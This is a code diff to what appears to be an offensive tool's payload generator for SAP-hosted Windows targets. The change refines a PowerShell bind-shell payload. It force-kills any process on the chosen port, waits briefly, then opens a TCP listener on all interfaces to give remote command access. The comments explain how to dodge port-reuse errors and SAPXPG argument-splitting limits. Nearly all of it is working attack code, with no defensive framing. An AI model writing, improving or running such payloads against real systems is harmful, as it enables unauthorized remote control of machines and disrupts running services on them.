@@ -1814,7 +1814,22 @@ def _generate_bind_payload(os_type: str, port: int,
     """Generate bind shell payload — opens a listening port on the target."""
     is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
     if is_win:
-        ps = (f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
+        # Kill any zombie listener from a previous attempt.  Without
+        # this a fresh $l.Start() throws WSAEADDRINUSE (10048 — "Only
+        # one usage of each socket address") because the earlier
+        # process wedged in AcceptTcpClient() is still bound.  The
+        # cleanup runs inside the PowerShell payload itself (not as a
+        # separate SXPG pre-step) so we sidestep the SAPXPG whitespace-
+        # splitting issue that makes complex shell filters unusable
+        # over PARAMS/LONG_PARAMS.  `Get-NetTCPConnection` is available
+        # on every Windows Server 2012+ (via NetTCPIP module); the
+        # `-ErrorAction 0` swallows the harmless "no matching
+        # connection" case on a first-run target.  A short Sleep gives
+        # the kernel a moment to release the port after Stop-Process.
+        ps = (f"Get-NetTCPConnection -LocalPort {port} -State Listen "
+              f"-EA 0|%{{Stop-Process -Id $_.OwningProcess -Force -EA 0}};"
+              f"Start-Sleep -Milliseconds 500;"
+              f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
               f"$l.Start();"
               f"$c=$l.AcceptTcpClient();"
               f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
